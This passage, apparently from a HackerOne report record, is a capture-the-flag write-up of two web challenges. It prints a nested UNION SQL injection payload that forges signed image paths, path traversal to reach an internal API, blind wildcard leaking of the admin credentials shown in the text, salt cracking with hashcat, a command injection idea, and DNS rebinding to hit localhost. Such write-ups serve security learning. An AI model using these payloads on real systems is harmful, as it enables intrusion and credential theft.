GET parameter value as ```jdh34k ```, we get three pictures.\nThese pictures are embedded to the page by the following way:\n{F1165599}\n\nHere is an URL of one of these pictures:\n```/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzliODgxYWY4YjMyZmYwN2Y2ZGFhZGE5NWZmNzBkYzNhLmpwZyIsImF1dGgiOiJlOTM0ZjQ0MDdhOWRmOWZkMjcyY2RiOWMzOTdmNjczZiJ9 ```\n\nI noticed the ```data``` GET parameter value is a base64 encoded value, so I decoded it:\n\nThis is the decoded value of the aforementioned base64 string:\n```{\"image\":\"r3c0n_server_4fdk59\\/uploads\\/9b881af8b32ff07f6daada95ff70dc3a.jpg\",\"auth\":\"e934f4407a9df9fd272cdb9c397f673f\"} ```\n\nAs we can see this is a JSON format which contains the two following keys:\n1.image\n2.hash\n\nThe first thing we can learn from this JSON is the folder ```/uploads ``` which has the actual images. I tried to manually access the ```/uploads``` folder, but I failed to do so (HTTP 403 Forbidden). Then, I tried to access the ```9b881af8b32ff07f6daada95ff70dc3a.jpg``` image file directly, but I received the following error message:\n```Image cannot be viewed directly```.\n\nBack to the JSON:\nThe second thing I tried was to change the path inside the ```image ``` value, to something else. For example:\n1.I tried to change it to other existing image file - failed due to ```invalid authentication hash ```.\n2.I tried to use some Path Traversal techniques - failed due to ```invalid authentication hash ```.\n3.I also tried to manipulate the ```hash``` value, so the server validation will pass, but it did not work - failed due to ```invalid authentication hash```.\n4.I tried to change the form of this JSON keys to arrays - failed due to ```Invalid data format ```.\n5.I also tried to send the ```image``` key twice, with one correct ```hash``` (vice versa) - failed ```invalid authentication hash ```.\n6.I even tried to guess other \"hidden\" keys, using brute force by the Burp Suite extension ```Turbo Intruder ```.\n\nIt seems like the goal is not so clear, I had no idea what to do, so I started all over again.\nThis time I noticed the following message in the first page of the challenge:\n```We are currently developing an API, apologies for anything that doesn't work quite right ```.\nI simply accessed ```/api ``` endpoint and it worked:\n{F1165624}\n\nThen, I tried to brute force for \"hidden\" API endpoints using Burp Suite Intruder with a simple API wordlist.\neach request got the same response:\n```{\"error\":\"This endpoint cannot be visited from this IP address\"} ```\n\nAt this point, I tried several things such as adding some ```X- ``` HTTP headers to my requests.\nFor instance, the ```X-Forwarded-For ``` HTTP header with the value 127.0.0.1. I also attempted to abuse hop-by-hop headers, but still nothing.\n\nI had a plan but I did not know how to execute it. My plan was to execute the brute force attack for the ```/api/ ``` endpoint, using the ```/picture ``` endpoint.\nAs far I as know the ```/picture ``` endpoint causes the server to fetch the desired image for me. Meaning the __server__ performs the request, which will bypass the ```{\"error\":\"This endpoint cannot be visited from this IP address\"} ``` error message. But, I have to somehow bypass the ```hash``` restriction.\n\nI had no idea how to manipulate the ```hash``` validation, so I checked again all of the endpoints I already know. Maybe I missed something. Few seconds later, I realized that I missed the ```/album?hash=``` endpoints.\nI tried to tamper with the ```hash``` GET parameter value in any way I know. I decided to execute ```sqlmap``` tool in order to find SQL injection vulnerability, and I took a break a long break.\n\nAfter few hours, I noticed that the ```sqlmap``` discovered that ```hash``` GET parameter is vulnerable to a Blind SQL Injection attack! :)\nNow, I can dump the whole content of the database, and maybe I will find the flag!.\nHowever, it makes no sense to find the flag in the database, since I did not use the ```/api/ ``` endpoints at all.\n\nI launched ```sqlmap ``` which gave me the following information:\nThere are two databases:\n1.recon\n2.information_schema\n\nI decided to focus on the ```recon``` database, and therefore, I reconfigured ```sqlmap ```, and relaunched the attack:\nSeveral minutes later, I had the following data:\n\n```\nDatabase: recon\nTable: photo\n[6 entries]\n+----+----------+--------------------------------------+\n| id | album_id | photo                                |\n+----+----------+--------------------------------------+\n| 1  | 1        | 0a382c6177b04386e1a45ceeaa812e4e.jpg |\n| 2  | 1        | 1254314b8292b8f790862d63fa5dce8f.jpg |\n| 3  | 2        | 32febb19572b12435a6a390c08e8d3da.jpg |\n| 4  | 3        | db507bdb186d33a719eb045603020cec.jpg |\n| 5  | 3        | 9b881af8b32ff07f6daada95ff70dc3a.jpg |\n| 6  | 3        | 13d74554c30e1069714a5a9edda8c94d.jpg |\n+----+----------+--------------------------------------+\n\nDatabase: recon\nTable: album\n[3 entries]\n+----+--------+-----------+\n| id | hash   | name      |\n+----+--------+-----------+\n| 1  | 3dir42 | Xmas 2018 |\n| 2  | 59grop | Xmas 2019 |\n| 3  | jdh34k | Xmas 2020 |\n+----+--------+-----------+\n```\n\nNoticed the ```hash ``` key of the JSON data, which was used in order to validate the ```image ``` value, is not stored in the database o_o. Meaning the server somehow calculates this hash on the fly.\nI had to guess how things work behind the scenes.\nMy guess was:\n1.I access the ```/album?hash=jdh34k ``` endpoint.\n2.The server executes a SQL query, which attempts to find what is the ```id``` of that ```hash ``` in ```album ``` table.\nIn this case the hash ```jdh34k``` would be ```id ``` 3.\n```\n| id | hash   | name      |\n+----+--------+-----------+\n| 3  | jdh34k | Xmas 2020 |\n```\n3.Then the server executes another query, using that output, and it looks in the ```photo``` table, specifically on the ```album_id ``` column, in order to fetch all of the ```photo ``` column content that are related to this ```album_id ```.\nIn our case:\n```\n| id | album_id | photo                                |\n+----+----------+--------------------------------------+\n| 4  | 3        | db507bdb186d33a719eb045603020cec.jpg |\n| 5  | 3        | 9b881af8b32ff07f6daada95ff70dc3a.jpg |\n| 6  | 3        | 13d74554c30e1069714a5a9edda8c94d.jpg |\n```\n4.The server will calculate a valid ```hash``` for the aforementioned photos.\n5.Then, this valid ```hash``` will be displayed on the HTML page.\n\nMy plan is to manipulate the output of the first SQL query, using the SQL Injection vulnerability, in such a manner that will affect the ```photo ``` value, which is then used by the server in its ```hash ``` calculation process.\nMore specifically, I want to gain full control over the ```photo ``` value, then I will be able to retrieve a valid ```hash``` from the server, without even knowing the algorithm :)\n\nI started to manually test the SQL Injection vulnerability as you can see in the following pictures:\n\nSQL Injection test:\n{F1165601}\nThe number 3 is reflected back in the HTML page, which means the injection point is not 3rd column.\n\nAt this point, I noticed it is possible to exploit a Reflected XSS vulnerability, using SQL Injection :D\n{F1165602}\nIt has nothing to do with the solution of this challenge.\n\nI tried to manipulate the query by injecting another UNION operator, which will be used as the input of the 2nd SQL query, that I was looking to exploit, and it worked!\n{F1165603}\n\nThe server calculated the hash for the input __123__:\n{F1165604}\n\nLets break down my exploit:\n\n```?hash=jdh34k'+AND+1=2+union+select+\"'+union+select+null,null,'123'--+\",2,3--+ ```\n\n1.First, we are using the single quote ```' ``` character to breakout the original SQL query.\n2.Then, we concatenate the AND operator with a false statement. we could also supply a wrong ```hash``` value, instead of using the AND operator.\n3. We use the UNION operator and we are setting the first column to the following string:\n```\"'+union+select+null,null,'123'--+\" ```\n\nThis string starts with a single quote character ```' ```, which will escape the 2nd SQL query. \nAlso, the UNION operator is selecting three columns, as the second SQL query is expecting to get three columns results.\nAt the end of the second query injection there I added the ```--+\" ``` characters due to the fact the we just escaped from the original second query and we don't want to \"break\" the syntax.\nThe quotes ```\" ``` character is used to close the string of this injection payload (do not forget, we are injecting this payload by using another UNION operator).\nNow, I just simply added the ```,2,3--+``` data, as part of the first UNION operator.\n\nRight now, I had the ability to cryptographically sign arbitrary ```image``` file, but our input is concatenated to the ```/uploads/ ``` folder as you can see here:\n\n```{\"image\":\"r3c0n_server_4fdk59\\/uploads\\/123\",\"auth\":\"80317c9bb75fec6949fd4e33b329e4a1\"} ```\n\nWell, I just used a Path Traversal ```../ ``` sequence in order to read access arbitrary endpoints.\nFirst, I tried to access a resource, which is out of this challenge, for example the ```/assets/images/grinch-networks.png ```\n\nInput:\n```?hash=jdh34k'+AND+1=2+union+select+\"'+union+select+null,null,'../../assets/images/grinch-networks.png'--+\",2,3--+ ```\n\nOutput (base64 decoded):\n```{\"image\":\"r3c0n_server_4fdk59\\/uploads\\/..\\/..\\/assets\\/images\\/grinch-networks.png\",\"auth\":\"e074528ae20d136249766f2cef6e3279\"} ```\n\nI accessed the following endpoint, and it worked :)\n```/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC8uLlwvYXNzZXRzXC9pbWFnZXNcL2dyaW5jaC1uZXR3b3Jrcy5wbmciLCJhdXRoIjoiZTA3NDUyOGFlMjBkMTM2MjQ5NzY2ZjJjZWY2ZTMyNzkifQ== ```\n\nSo I started to manually search for ```/api/``` endpoints using this technique:\n\nFor example:\nInput (inside the UNION operator):\n```../api/test ```\n\nOutput:\n```Expected HTTP status 200, Received: 404 ```\n\nThere is no ```/api/test``` endpoint, but, at least I managed to bypass this error message:\n```{\"error\":\"This endpoint cannot be visited from this IP address\"} ```\n\nAfter few attempts I had a hit!\n\nInput (inside the UNION operator):\n```../api/user ```\n\nOutput:\n```Invalid content type detected ```\n\nI started to look for HTTP GET parameters:\n\nInput (inside the UNION operator):\n```../api/user?a=a ```\n\nOutput:\n```Expected HTTP status 200, Received: 400 ```\n\nNotice the HTTP status is __400__ and not 404.\nAccording to the ```/api``` endpoint, I could understand that I just need to find the right variable:\n{F1165605}\n\nAgain, I manually searched for GET parameters:\n\nInput (inside the UNION operator):\n```../api/user?username= ```\n\nOutput:\n```Expected HTTP status 200, Received: 204 ```\n\nInput (inside the UNION operator):\n```../api/user?password= ```\n\nOutput:\n```Expected HTTP status 200, Received: 204 ```\n\nNotice the HTTP status this time is __204__\n{F1165606}\n\nI found the following HTTP GET parameters:\n1.username\n2.password\n\nI spent hours, trying to understand how I can exploit this, but nothing worked.\nThe next day, I had a desperate idea, what if the ```/api/user ``` endpoint is using the given username / password with a LIKE operator?.\nIf that is the case, I might be able to insert ```%``` as the username and as the password and that would return true.\n\nInput (inside the UNION operator):\n```../api/user?username=%%26password=% ```\n\nOutput:\n```Invalid content type detected ```\n\n__Note:__ The %26 is used as a URL encoded ampersand ```& ``` character due to the fact that our payload is sent in a URL context (the SQL Injection).\n\nI worked! I finally got a different response than ```HTTP Status 204```.\n\nI knew I can leak both the username and password using this \"blind\" technique. This time I created a simple python script to do that for me.\nThe script is attached to this writeup, and its name is recon.py\n\nI wanted to find a shortcut, maybe I can guess the username.\nI tried the following payload:\n\nInput (inside the UNION operator):\n```../api/user?username=grinch%%26password=% ```\n\nOutput:\n```Invalid content type detected ```\n\nit seems like the username starts with the string ```grinch ```, but I thought that I might have done something wrong so I added an ```a ``` character, as follows:\n\nInput (inside the UNION operator):\n```../api/user?username=grincha%%26password=% ```\n\nOutput:\n```Invalid content type detected ```\n\nIt worked again!, how is that possible? I tried to add another ```a ``` character:\n\nInput (inside the UNION operator):\n```../api/user?username=grinchaa%%26password=% ```\n\nOutput:\n```Expected HTTP status 200, Received: 204 ```\n\nSo the username really starts with the string grincha... what about grinchadmin?\n\nInput (inside the UNION operator):\n```../api/user?username=grinchadmin%%26password=% ```\n\nOutput:\n```Invalid content type detected ```\n\nThe username starts with ```grinchadmin ``` :D\nI checked if the username is equal to ```grinchadmin ``` by simply removing the ```% ``` character, so the string ```grinchadmin ``` must match the username in that database.\n\nI executed my script (recon.py) and it slowly leaked the password:\n{F1165607}\n\nAfter few minutes I got the password: ```S4NT4SUCKS ```.\nI tried to login using the credentials ```grinchadmin:S4NT4SUCKS ```, but it did not work... O_O\nThen I just remembered that I do not know the leaked characters should be lowercase or uppercase.\nI tried again with ```grinchadmin:s4nt4sucks ```, and it worked!\n{F1165608}\n\nChallenge 12 (Attack Box):\n---------------------\n__Tools I used:__ Burp Suite, hashcat, rbndr.us (DNS rebinding service).\n\nThis challenge starts with a page where we can choose a \"hardcoded\" target to attack.\nLaunching the attack on one of the targets, redirected me to ```/launch?payload= ``` endpoint.\n{F1165611}\n\nAs you can see, the base64 encoded string contains a JSON format with 2 keys:\n1.target\n2.hash\n\nChanging the the ```target``` value or the ```hash``` value, will fail with following error message:\n```Invalid Protection Hash ```\n\nAlso, I noticed a cooldown mechanism, which forbids you from launching the attack again and again.\nAfter playing a bit with the JSON formatI received the following error message:\n```only one request per 15 seconds ```\n\nThis error message indicates that we should not focus on launching the attack which probably spams the server, but we should focus on something else.\n\nLaunching the attack redirected me to a specific page, which contained information regarding my attack:\n{F1165612}\n\nFor example, this hash ```53d34f2e30d830e77deed8853fdb1038 ``` is related to the attack that I have just launched.\nAfter my browser accessed the ```/attack-box/launch/53d34f2e30d830e77deed8853fdb1038 ``` URL, I noticed some requests (XHR) in my Burp Suite to ```/attack-box/launch/53d34f2e30d830e77deed8853fdb1038.json?id=49046 ```\n\nI tried to tamper with every single parameter in the website, but it led me to nowhere.\n\nI tried to understand what is the connection between these IP addresses to there corresponding ```hash ```:\n\n```\n{\"target\":\"203.0.113.33\",\"hash\":\"5f2940d65ca4140cc18d0878bc398955\"}\n{\"target\":\"203.0.113.53\",\"hash\":\"2814f9c7311a82f1b822585039f62607\"}\n{\"target\":\"203.0.113.213\",\"hash\":\"5aa9b5a497e3918c0e1900b2a2228c38\"}\n```\n\nThese hashes might be a MD5 hash due to its length.\nAt some point I started to use an online service, which accepts a string and calculates various hashes for it, but the expected hash was not included in the results :(\n\nI had a plan but I was not sure about it at all. My plan was to be able to calculate a hash for any given input, then I will set the target as ```127.0.0.1 ```, which should cause the system to attack itself :D, but maybe that is not the solution.\n\nI had another idea, as you can see here:\n{F1165613}\n\nthe hash in used as an argument to the ```ddos ``` binary. maybe I can generate such a hash that will be something like that:\n```abc;ls; ```\nthen this command would be executed in the server:\n```./ddos --load abc;ls;.target ```\n\nAs you can see, controlling the hash value may enable me to injection an OS command (RCE). but how is that possible to actually generate such a hash? might be impossible.\n\nBack to plan 1:\nI used the tool ```hashcat ``` in order to crack the hash, but first, the target IP must be used in some way in the process of the hash calculation.\nI used the known ```rockyou.txt ``` wordlist, combined with the target IP:\n\nFirst I created the file ```combine ```, which had this content:\n\n```\n203.0.113.33\n203.0.113.53\n203.0.113.213\n```\nThen, I used the ```combinator.bin ``` to concatenate each string within the ```rockyou.txt ``` file with each one of these IPs:\n\n/usr/share/hashcat-utils/combinator.bin /root/Downloads/rockyou.txt combine > combined_wordlist.txt\n\nThe results are saved in the file ```combined_wordlist.txt ```. For example:\n```\npassword203.0.113.33\npassword203.0.113.53\npassword203.0.113.213\niloveyou203.0.113.33\niloveyou203.0.113.53\niloveyou203.0.113.213\n```\nI launched the attack, and I knew it could be the opposite way - the IP might also be at the start of the string.\n\nAfter few seconds it found the salt!\n{F1165614}\n\nThe salt was:\n```mrgrinch463 ```\n\nNow I can generate a hash for any arbitrary input I want. I started with ```127.0.0.1 ``` as the input:\n{F1165615}\n\nI crafted the following JSON payload:\n```{\"target\":\"127.0.0.1\",\"hash\":\"3e3f8df1658372edf0214e202acb460b\"} ```\nI base64 encoded it, and I sent the request, and it got accepted, it worked!. I checked the attack details:\n{F1165616}\n\nAs you can see there is an additional protection mechanism which prevents me from being able to attack the localhost. At this point I started to try various techniques to attack the localhost without being detected:\n\n1.I tried to represent the IP 127.0.0.1 as an octal - failed.\n2.Representing the IP as hex - failed.\n3.Tried to target ```vcap.me ``` domain, which points to ```127.0.0.1 ``` - failed.\n4.Maybe IPv6? - failed.\n5. 0.0.0.0 - did not fail, but did not work :D\n6. Decimal representation - failed.\n\nIn case of sending a DNS as the target IP, the server attempts to resolve it twice.\n{F1165617}\n\nDNS Rebinding attack!\n\nI used ```rbndr.us ```, which is an online service for DNS Rebinding.\nWe can send a specific DNS that holds 2 records. By doing so, we might be able to bypass the IP validation, in case IP validation occurs only for the first time, but then, the server might use the IP from the second time it resolves the DNS. \n\nMy plan was to send a DNS which will point to ```8.8.8.8 ``` for the first resolve, and ```127.0.0.1 ``` for the second resolve. This must be it!\n\nThe DNS:\n```08080808.7f000001.rbndr.us ```\n\nI calculated the hash for this DNS and I sent the payload to the server, and it failed.\nI tried several times and it failed, at this point I had no other ideas and I went to sleep.\n\nThe next day, I had a crazy idea:\nWhat if I can pull out the internal server IP, using the previous challenge SQL Injection vulnerability and simply use that.\nI exploited the Recon Server challenge again and I pulled out the hostname information.\nLocal IP: ```172.31.15.248 ```\nI launched the attack but it was blocked:\n{F1165618}\n\nI tried the DNS Rebinding attack once again ```08080808.7f000001.rbndr.us ```, this time it worked :O\nI also tried ```08080808.ac1f0ff8.rbndr.us ```, and it worked as well :D\n\nThe Final Flag:\n---------------------\n\n{F1129602}",
      "user": {
        "id": 830601,
        "username": "a_l",
        "name": "Laish",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": null,
        "location": "",
        "created_at": "2019-11-22T10:59:17.980Z",
        "url": "https://hackerone.com/a_l",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/3834ivexhtfn5ozuouyjm8hyzwwl/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/3834ivexhtfn5ozuouyjm8hyzwwl/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/3834ivexhtfn5ozuouyjm8hyzwwl/114764ec8f01b1a3e153599212c9f011fb3b0bce3a4fdc1f9a3c551f8c94acf8"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    }
  ]
}
